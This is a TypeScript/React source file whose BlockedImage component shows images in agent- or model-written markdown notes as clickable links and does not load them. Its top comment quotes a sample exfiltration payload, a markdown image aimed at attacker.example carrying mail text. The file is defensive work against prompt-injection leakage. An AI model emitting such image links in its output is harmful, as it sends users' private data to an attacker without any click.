// Markdown written by someone other than the user (task notes an agent or a model wrote, Speakr
// summaries and notes) never loads an image: ![](https://attacker.example/?d=<mail text>) would
// make the browser send that data out with no click. The image becomes a link the user can choose
// to open, labelled with its alt text or its host.

import type { ReactNode } from 'react'
import { t } from '../i18n'

function hostOf(url: string): string {
  try {
    return new URL(url, typeof location === 'undefined' ? 'http://localhost/' : location.href).hostname || 'image'
  } catch {
    return 'image'
  }
}

export function BlockedImage({ src, alt }: { src?: unknown; alt?: string }): ReactNode {
  const url = typeof src === 'string' ? src : ''
  if (!url) return <span className="md-img-blocked">{alt || 'image'}</span>
  return (
    <a href={url} target="_blank" rel="noopener noreferrer nofollow" className="md-img-blocked" title={url}>
      {t('lib.markdownImages.image', { alt: alt || hostOf(url) })}
    </a>
  )
}
